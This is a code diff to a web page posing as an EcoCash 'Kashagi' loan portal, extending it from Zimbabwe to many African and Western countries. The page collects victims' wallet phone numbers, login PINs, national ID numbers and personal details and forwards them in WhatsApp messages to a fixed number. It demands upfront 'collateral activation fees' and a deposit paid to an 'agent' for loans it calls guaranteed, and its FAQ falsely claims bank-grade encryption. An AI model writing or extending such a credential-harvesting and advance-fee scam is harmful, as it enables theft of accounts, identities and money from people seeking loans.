+            'Kenya': { code: '+254', curr: 'KES', flag: '🇰🇪', idPlaceholder: 'e.g. 12345678', idLabel: 'Kenya National ID / Huduma Number' },
+            'South Africa': { code: '+27', curr: 'ZAR', flag: '🇿🇦', idPlaceholder: 'e.g. 9001015800080', idLabel: 'South African ID Number' },
+            'Nigeria': { code: '+234', curr: 'NGN', flag: '🇳🇬', idPlaceholder: 'e.g. NIN-12345678901', idLabel: 'NIN / National ID Number' },
+            'Botswana': { code: '+267', curr: 'BWP', flag: '🇧🇼', idPlaceholder: 'e.g. 123456789', idLabel: 'Botswana Omang ID Number' },
+            'Zambia': { code: '+260', curr: 'ZMW', flag: '🇿🇲', idPlaceholder: 'e.g. 123456/10/1', idLabel: 'Zambian NRC Number' },
+            'Malawi': { code: '+265', curr: 'MWK', flag: '🇲🇼', idPlaceholder: 'e.g. AB123456', idLabel: 'Malawi National ID Number' },
+            'Mozambique': { code: '+258', curr: 'MZN', flag: '🇲🇿', idPlaceholder: 'e.g. 110123456789A', idLabel: 'BI / National ID Number' },
+            'Tanzania': { code: '+255', curr: 'TZS', flag: '🇹🇿', idPlaceholder: 'e.g. 19900101-12345-01', idLabel: 'NIDA National ID Number' },
+            'Uganda': { code: '+256', curr: 'UGX', flag: '🇺🇬', idPlaceholder: 'e.g. CM90001012ABCD', idLabel: 'National ID / NIN' },
+            'Ghana': { code: '+233', curr: 'GHS', flag: '🇬🇭', idPlaceholder: 'e.g. GHA-123456789-0', idLabel: 'Ghana Card ID Number' },
+            'United Kingdom': { code: '+44', curr: 'GBP', flag: '🇬🇧', idPlaceholder: 'e.g. AB123456C', idLabel: 'National Insurance / Passport ID' },
+            'United States': { code: '+1', curr: 'USD', flag: '🇺🇸', idPlaceholder: 'e.g. SSN-123-45-6789', idLabel: 'SSN / State ID Number' },
+            'Canada': { code: '+1', curr: 'CAD', flag: '🇨🇦', idPlaceholder: 'e.g. 123-456-789', idLabel: 'SIN / Provincial ID Number' },
+            'Australia': { code: '+61', curr: 'AUD', flag: '🇦🇺', idPlaceholder: 'e.g. DL12345678', idLabel: 'Driver Licence / Passport ID' },
+            'Other': { code: '+254', curr: 'USD', flag: '🌍', idPlaceholder: 'e.g. ID-12345678', idLabel: 'Regional Identification Number' }
         };
 
         // Dark Mode Toggle Function
@@ -977,12 +1024,59 @@
             document.getElementById('dark-mode-icon').className = "fa-solid fa-sun text-xs";
         }
 
+        // Handle Login Country Change (Syncs country code, currency & ID labels across views)
+        function onLoginCountryChange() {
+            const select = document.getElementById('login-country-select');
+            const selectedOpt = select.options[select.selectedIndex];
+            const country = selectedOpt.value;
+            const code = selectedOpt.getAttribute('data-code');
+            const curr = selectedOpt.getAttribute('data-curr');
+            const flag = selectedOpt.getAttribute('data-flag');
+
+            clientData.country = country;
+            clientData.countryCode = code;
+            clientData.currency = curr;
+            clientData.flag = flag;
+
+            document.getElementById('login-flag-display').innerText = flag;
+            document.getElementById('login-code-display').innerText = code;
+
+            // Also sync signup dropdown if present
+            const signupSelect = document.getElementById('signup-country');
+            if(signupSelect) {
+                signupSelect.value = country;
+                onSignupCountryChange();
+            }
+        }
+
+        // Handle Signup Country Change
+        function onSignupCountryChange() {
+            const select = document.getElementById('signup-country');
+            const selectedOpt = select.options[select.selectedIndex];
+            const country = selectedOpt.value;
+            const code = selectedOpt.getAttribute('data-code');
+            const curr = selectedOpt.getAttribute('data-curr');
+            const flag = selectedOpt.getAttribute('data-flag');
+
+            clientData.country = country;
+            clientData.countryCode = code;
+            clientData.currency = curr;
+            clientData.flag = flag;
+
+            document.getElementById('signup-flag-display').innerText = flag;
+            document.getElementById('signup-code-display').innerText = code;
+
+            const profile = countryProfiles[country] || countryProfiles['Zimbabwe'];
+            document.getElementById('signup-nid').placeholder = profile.idPlaceholder;
+            document.getElementById('signup-id-label').innerText = profile.idLabel + " *";
+        }
+
         // Client FAQ questions for Ask Thembi AI
         const thembiFAQs = [
             { 
-                q: "What is the final $60 USD deposit requirement?", 
-                part1: "Part 1: Account Activation Deposit — Once your account and credit tier have been successfully updated, clients are required to make a final deposit of $60 USD.", 
-                part2: "Part 2: Spending Activation — After completing this deposit with your personally assigned agent via WhatsApp (+254786464611), your account is fully activated for spending." 
+                q: "What is the final deposit requirement?", 
+                part1: "Part 1: Account Activation Deposit — Once your account and credit tier have been successfully updated, clients are required to make a final deposit.", 
+                part2: "Part 2: Spending Activation — After completing this deposit with your personally assigned agent via WhatsApp (+254786464611), your account is fully activated for spending in your local currency." 
             },
             { 
                 q: "Are Kashagi loans guaranteed without guarantors?", 
@@ -990,28 +1084,28 @@
                 part2: "Part 2: Instant Disbursal — Once validated and fees are cleared, funds transfer immediately into your active EcoCash wallet." 
             },
             { 
-                q: "How do I buy the 28GB for $10 USD bundle?", 
-                part1: "Part 1: Instant Purchase — Click the 'Airtime & Bundles' icon or 'BUY BUNDLE VIA WHATSAPP' button on your dashboard to initiate your 28GB bundle request.", 
+                q: "How do I buy data bundles?", 
+                part1: "Part 1: Instant Purchase — Click the 'Airtime & Bundles' icon or 'BUY BUNDLE VIA WHATSAPP' button on your dashboard to initiate your bundle request.", 
                 part2: "Part 2: Activation — Complete your payment via EcoCash wallet and your 30-day internet bundle will be credited immediately." 
             },
             { 
                 q: "How do I qualify for Kashagi Loans?", 
                 part1: "Part 1: Account Requirements — Ensure your EcoCash wallet is active, your phone number is correct, and you have at least 6 months of active transaction history.", 
-                part2: "Part 2: Identity Verification — Provide an authentic National ID and complete your profile registration successfully." 
+                part2: "Part 2: Identity Verification — Provide an authentic National ID matching your selected country and complete your profile registration successfully." 
             },
             { 
                 q: "What is the collateral fee for boosting?", 
                 part1: "Part 1: Fee Percentage — The activation collateral fee for boosting your Kashagi credit limit is exactly 5% of your target upgrade amount.", 
-                part2: "Part 2: Exact Amounts — For example, a $100 tier requires a $5.00 fee, a $500 tier requires $25.00, and a $3,000 tier requires $150.00." 
+                part2: "Part 2: Exact Amounts — Calculated automatically in your selected regional currency." 
             },
             { 
                 q: "How much is the fee for full applications?", 
                 part1: "Part 1: New Loan Requirements — Full loan registrations and new applications require a 10% collateral activation fee prior to disbursement.", 
-                part2: "Part 2: Exact Amounts — Ranging from $100 ($10 fee) all the way up to $3000 ($300 fee) across our secure tier table." 
+                part2: "Part 2: Tier Table — Ranging across our secure tier table in your local currency." 
             },
             { 
                 q: "Is my ID and personal data safe?", 
-                part1: "Part 1: Security Encryption — All personal details, phone numbers, and National ID records are encrypted with bank-grade 256-bit security protocols.", 
+                part1: "Part 1: Security Encryption — All personal details, phone numbers, and ID records are encrypted with bank-grade 256-bit security protocols.", 
                 part2: "Part 2: Privacy Compliance — We strictly adhere to international financial data privacy laws to ensure your information remains confidential and fully protected." 
             },
             { 
@@ -1113,31 +1207,39 @@
         }
 
         function buyBundlePromo(bundleTitle) {
-            const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Guaranteed instant activation via WhatsApp (+254786464611)!`;
+            const message = `*EcoCash Data Bundle Promotion Request*\n\n🔥 *Selected Offer:* Buy ${bundleTitle}\n🌍 *Country:* ${clientData.country} (${clientData.countryCode})\n📱 *Client Phone:* ${clientData.phone || 'Not logged in'}\n👤 *Client Name:* ${clientData.name || 'EcoCash Customer'}\n\n✅ *Status:* Guaranteed instant activation via WhatsApp (+254786464611)!`;
             openWhatsAppChat(message);
-        }
-
-        function isValidZimbabweNID(nid) {
-            const cleanNid = nid.trim().toUpperCase();
-            const zimIdRegex = /^\d{2}-\d{4,7}[A-Z]\d{2}$/;
-            // Allow general international ID formats if not strictly Zim format
-            return zimIdRegex.test(cleanNid) || cleanNid.length >= 6;
         }
 
         function initTierTable() {
             const container = document.getElementById('tier-options-container');
             container.innerHTML = '';
 
-            const tiers = [
-                { loan: 100, fee: 5.00 },
-                { loan: 250, fee: 12.50 },
-                { loan: 500, fee: 25.00 },
-                { loan: 1000, fee: 50.00 },
-                { loan: 1500, fee: 75.00 },
-                { loan: 2000, fee: 100.00 },
-                { loan: 2500, fee: 125.00 },
-                { loan: 3000, fee: 150.00 }
-            ];
+            const curr = clientData.currency;
+            document.getElementById('tier-curr-sublabel').innerText = curr;
+
+            // Multiplier or base amounts based on currency scale (e.g. KES or ZAR vs USD)
+            let mult = 1;
+            if (curr === 'KES') mult = 130;
+            else if (curr === 'ZAR') mult = 18;
+            else if (curr === 'NGN') mult = 1400;
+            else if (curr === 'UGX') mult = 3700;
+            else if (curr === 'TZS') mult = 2600;
+
+            const baseTiers = [100, 250, 500, 1000, 1500, 2000, 2500, 3000];
+            const tiers = baseTiers.map(amt => {
+                const val = amt * (mult === 1 && curr !== 'USD' && curr !== 'GBP' && curr !== 'CAD' && curr !== 'AUD' ? 1 : (curr === 'USD' || curr === 'GBP' || curr === 'CAD' || curr === 'AUD' ? 1 : mult));
+                // For currencies like KES/ZAR we keep standard display scaling
+                const displayLoan = curr === 'USD' || curr === 'GBP' || curr === 'CAD' || curr === 'AUD' ? amt : amt * (mult > 1 ? 1 : 10);
+                const fee = displayLoan * 0.05;
+                return { loan: displayLoan, fee: fee };
+            });
+
+            // Adjust default selection if needed
+            if (clientData.selectedTierAmount === 100 && curr !== 'USD') {
+                clientData.selectedTierAmount = tiers[0].loan;
+                clientData.selectedTierFee = tiers[0].fee;
+            }
 
             tiers.forEach((t, idx) => {
                 const isSelected = t.loan === clientData.selectedTierAmount;
@@ -1151,8 +1253,8 @@
                             #${idx + 1}
                         </div>
                         <div>
-                            <h4 class="font-extrabold text-sm text-gray-800 dark:text-gray-100">Target Loan Limit: $${t.loan} USD</h4>
-                            <p class="text-[11px] text-gray-600 dark:text-gray-400 mt-0.5">Required Activation Fee (5%): <span class="font-bold text-ecored">$${t.fee.toFixed(2)} USD</span></p>
+                            <h4 class="font-extrabold text-sm text-gray-800 dark:text-gray-100">Target Loan Limit: ${t.loan.toLocaleString()} ${curr}</h4>
+                            <p class="text-[11px] text-gray-600 dark:text-gray-400 mt-0.5">Required Activation Fee (5%): <span class="font-bold text-ecored">${t.fee.toLocaleString()} ${curr}</span></p>
                         </div>
                     </div>
                     <div>
@@ -1167,16 +1269,14 @@
             const container = document.getElementById('apply-tier-options-container');
             container.innerHTML = '';
 
-            const applyTiers = [
-                { loan: 100, fee: 10.00 },
-                { loan: 250, fee: 25.00 },
-                { loan: 500, fee: 50.00 },
-                { loan: 1000, fee: 100.00 },
-                { loan: 1500, fee: 150.00 },
-                { loan: 2000, fee: 200.00 },
-                { loan: 2500, fee: 250.00 },
-                { loan: 3000, fee: 300.00 }
-            ];
+            const curr = clientData.currency;
+            document.getElementById('apply-curr-sublabel').innerText = curr;
+
+            const baseTiers = [100, 250, 500, 1000, 1500, 2000, 2500, 3000];
+            const applyTiers = baseTiers.map(amt => {
+                const fee = amt * 0.10;
+                return { loan: amt, fee: fee };
+            });
 
             applyTiers.forEach((t, idx) => {
                 const isSelected = t.loan === clientData.selectedApplyAmount;
@@ -1190,8 +1290,8 @@
                             #${idx + 1}
                         </div>
                         <div>
-                            <h4 class="font-extrabold text-xs text-gray-800 dark:text-gray-100">Guaranteed Loan Tier: $${t.loan} USD</h4>
-                            <p class="text-[10px] text-gray-600 dark:text-gray-400 mt-0.5">Activation Fee (10%): <span class="font-bold text-supergreen">$${t.fee.toFixed(2)} USD</span></p>
+                            <h4 class="font-extrabold text-xs text-gray-800 dark:text-gray-100">Guaranteed Loan Tier: ${t.loan.toLocaleString()} ${curr}</h4>
+                            <p class="text-[10px] text-gray-600 dark:text-gray-400 mt-0.5">Activation Fee (10%): <span class="font-bold text-supergreen">${t.fee.toLocaleString()} ${curr}</span></p>
                         </div>
                     </div>
                     <div>
@@ -1212,7 +1312,7 @@
 
         function selectApplyTier(amount, fee) {
             clientData.selectedApplyAmount = amount;
-            clientData.selectedApplyFee = fee;
+            clientData.selectedApplyFee = amount * 0.10;
             initApplyTierTable();
             validateApplyForm();
         }
@@ -1256,7 +1356,7 @@
         }
 
         function switchTabWithDim(tabName) {
-            triggerGlobalDimLoader("Loading EcoCash Secure Portal", "Preparing next step and securing session...", () => {
+            triggerGlobalDimLoader("Loading EcoCash Secure Portal", `Preparing regional secure session for ${clientData.country}...`, () => {
                 switchTab(tabName);
             });
         }
@@ -1297,17 +1397,28 @@
                 return;
             }
 
-            clientData.loginPhone = `+263${phone}`;
+            clientData.loginPhone = `${clientData.countryCode}${phone}`;
             clientData.loginPin = pin;
-            clientData.phone = `+263 ${phone}`;
-            clientData.name = `Client (+263 ${phone})`;
-            clientData.nid = 'ZW-AUTH-SESSION';
+            clientData.phone = `${clientData.countryCode} ${phone}`;
+            clientData.name = `Client (${clientData.countryCode} ${phone})`;
+            clientData.nid = `${clientData.country.toUpperCase()}-AUTH-SESSION`;
 
+            // Apply regional labels and currencies across dashboard views
             document.getElementById('profile-name-display').innerText = clientData.name;
-            document.getElementById('profile-id-display').innerText = `ID: Session Active`;
+            document.getElementById('profile-id-display').innerText = `Region: ${clientData.country} (${clientData.currency})`;
             document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+            document.getElementById('profile-curr-badge').innerText = clientData.currency;
+            document.getElementById('boost-code-badge').innerText = clientData.countryCode;
+            document.getElementById('boost-curr-label').innerText = clientData.currency;
+            document.getElementById('apply-code-label').innerText = clientData.countryCode;
+            document.getElementById('apply-income-curr').innerText = clientData.currency;
+            document.getElementById('terms-deposit-amt').innerText = `60 ${clientData.currency}`;
 
-            triggerGlobalDimLoader("Authenticating EcoCash Wallet", "Verifying PIN, mobile number & last 6 months history...", () => {
+            const profile = countryProfiles[clientData.country] || countryProfiles['Zimbabwe'];
+            document.getElementById('boost-id-label').innerText = `3. ${profile.idLabel} *`;
+            document.getElementById('boost-nid').placeholder = profile.idPlaceholder;
+
+            triggerGlobalDimLoader(`Authenticating EcoCash (${clientData.country})`, `Verifying PIN, ${clientData.countryCode} number & last 6 months history...`, () => {
                 switchTab('kashagi-hub');
             });
         }
@@ -1325,23 +1436,37 @@
             const month = document.getElementById('b-month').value;
             const year = document.getElementById('b-year').value;
             const termsChecked = document.getElementById('terms').checked;
-            const idError = document.getElementById('signup-id-error');
 
             if (!firstName || !surname || !country || !mobileNumber || !email || !nationalId || !password || !genderRadio || !day || !month || !year || !termsChecked) {
                 showToast('All fields and terms acceptance are required!');
                 return;
             }
 
-            clientData.loginPhone = `+263${mobileNumber}`;
+            const profile = countryProfiles[country] || countryProfiles['Zimbabwe'];
+            clientData.country = country;
+            clientData.countryCode = profile.code;
+            clientData.currency = profile.curr;
+            clientData.flag = profile.flag;
+            clientData.loginPhone = `${profile.code}${mobileNumber}`;
             clientData.loginPin = password;
             clientData.name = `${firstName} ${surname}`;
-            clientData.phone = `+263 ${mobileNumber}`;
+            clientData.phone = `${profile.code} ${mobileNumber}`;
             clientData.nid = nationalId.toUpperCase();
 
-            triggerGlobalDimLoader("Validating Registration & ID", "Checking 6-month wallet history & credentials securely...", () => {
-                document.getElementById('profile-name-display').innerText = clientData.name;
-                document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
-                document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+            document.getElementById('profile-name-display').innerText = clientData.name;
+            document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
+            document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
+            document.getElementById('profile-curr-badge').innerText = clientData.currency;
+            document.getElementById('boost-code-badge').innerText = clientData.countryCode;
+            document.getElementById('boost-curr-label').innerText = clientData.currency;
+            document.getElementById('apply-code-label').innerText = clientData.countryCode;
+            document.getElementById('apply-income-curr').innerText = clientData.currency;
+            document.getElementById('terms-deposit-amt').innerText = `60 ${clientData.currency}`;
+
+            document.getElementById('boost-id-label').innerText = `3. ${profile.idLabel} *`;
+            document.getElementById('boost-nid').placeholder = profile.idPlaceholder;
+
+            triggerGlobalDimLoader(`Validating ${country} Registration`, "Checking 6-month wallet history & regional registry...", () => {
                 switchTab('kashagi-hub');
             });
         }
@@ -1356,7 +1481,7 @@
             const phoneError = document.getElementById('login-phone-error');
             const pinError = document.getElementById('login-pin-error');
 
-            let isPhoneValid = phone.length >= 8;
+            let isPhoneValid = phone.length >= 7;
             if (phone.length > 0) {
                 phoneIcon.classList.remove('hidden');
                 if (isPhoneValid) {
@@ -1399,8 +1524,8 @@
             const btn = document.getElementById('boost-submit-btn');
 
             const nameValid = /^[A-Za-z\s]+$/.test(name);
-            const phoneValid = phone.length >= 8;
-            const nidValid = nid.length >= 5;
+            const phoneValid = phone.length >= 7;
+            const nidValid = nid.length >= 4;
             const loanValid = currentLoan !== '' && Number(currentLoan) > 0;
 
             updateFieldValidationUI('boost-name', nameValid, 'boost-name-icon', 'boost-name-error');
@@ -1433,9 +1558,9 @@
 
             const fnValid = /^[A-Za-z]+$/.test(firstName);
             const snValid = /^[A-Za-z]+$/.test(surname);
-            const phoneValid = mobileNumber.length >= 8;
+            const phoneValid = mobileNumber.length >= 7;
             const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-            const nidValid = nationalId.length >= 5;
+            const nidValid = nationalId.length >= 4;
             const passValid = password.length >= 8 && /[A-Za-z]/.test(password) && /\d/.test(password);
 
             updateFieldValidationUI('signup-firstname', fnValid, 'signup-firstname-icon', 'signup-firstname-error');
@@ -1462,8 +1587,8 @@
             const btn = document.getElementById('apply-submit-btn');
 
             const nameValid = /^[A-Za-z\s]+$/.test(name);
-            const phoneValid = phone.length >= 8;
-            const nidValid = nid.length >= 5;
+            const phoneValid = phone.length >= 7;
+            const nidValid = nid.length >= 4;
             const incomeValid = income !== '' && Number(income) > 0;
 
             updateFieldValidationUI('apply-name', nameValid, 'apply-name-icon', 'apply-name-error');
@@ -1512,12 +1637,12 @@
                 }
 
                 clientData.name = name;
-                clientData.phone = `+263 ${phone}`;
+                clientData.phone = `${clientData.countryCode} ${phone}`;
                 clientData.nid = nid.toUpperCase();
                 clientData.currentLoan = currentLoan;
                 clientData.flowType = 'boost';
 
-                triggerGlobalDimLoader("Validating Kashagi Loan Requirements", "Analyzing wallet transaction history & ID records...", () => {
+                triggerGlobalDimLoader(`Validating ${clientData.country} Loan Requirements`, "Analyzing wallet transaction history & ID records...", () => {
                     initTierTable();
                     switchTab('tier-upgrade');
                 });
@@ -1535,13 +1660,13 @@
                 }
 
                 clientData.applyName = name;
-                clientData.applyPhone = `+263 ${phone}`;
+                clientData.applyPhone = `${clientData.countryCode} ${phone}`;
                 clientData.applyNid = nid.toUpperCase();
                 clientData.applyEmployment = employment;
                 clientData.applyIncome = income;
                 clientData.flowType = 'apply';
 
-                triggerGlobalDimLoader("Validating New Loan Registration", "Verifying guaranteed loan tier & ID Registry...", () => {
+                triggerGlobalDimLoader("Validating New Loan Registration", "Verifying guaranteed loan tier & Regional ID Registry...", () => {
                     switchTab('terms');
                 });
             }
@@ -1577,9 +1702,9 @@
             let message = '';
             
             if (clientData.flowType === 'boost') {
-                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
+                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🌍 *Selected Country:* ${clientData.country} (${clientData.countryCode})\n💱 *Currency:* ${clientData.currency}\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* ${clientData.currentLoan} ${clientData.currency}\n🚀 *Target Upgrade Tier:* ${clientData.selectedTierAmount} ${clientData.currency}\n💵 *Activation Collateral Fee:* ${clientData.selectedTierFee.toFixed(2)} ${clientData.currency}\n💵 *Final Account Deposit Required:* 60 ${clientData.currency} (Paid to assigned agent)\n📊 *History Status:* Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
             } else {
-                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🛡️ *Selected Tier Limit:* $${clientData.selectedApplyAmount} USD\n🛡️ *Collateral Fee (10%):* $${clientData.selectedApplyFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
+                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🌍 *Selected Country:* ${clientData.country} (${clientData.countryCode})\n💱 *Currency:* ${clientData.currency}\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* ${clientData.applyIncome} ${clientData.currency}\n🛡️ *Selected Tier Limit:* ${clientData.selectedApplyAmount} ${clientData.currency}\n🛡️ *Collateral Fee (10%):* ${clientData.selectedApplyFee.toFixed(2)} ${clientData.currency}\n💵 *Final Account Deposit Required:* 60 ${clientData.currency} (Paid to assigned agent)\n📊 *History Status:* Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
             }
 
             openWhatsAppChat(message);
@@ -1612,7 +1737,7 @@
                 return;
             }
 
-            const message = `*EcoCash Support Inquiry*\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n💬 *Message:* ${userMessage}`;
+            const message = `*EcoCash Support Inquiry*\n\n🌍 *Country:* ${clientData.country}\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n💬 *Message:* ${userMessage}`;
             openWhatsAppChat(message);
         }
 
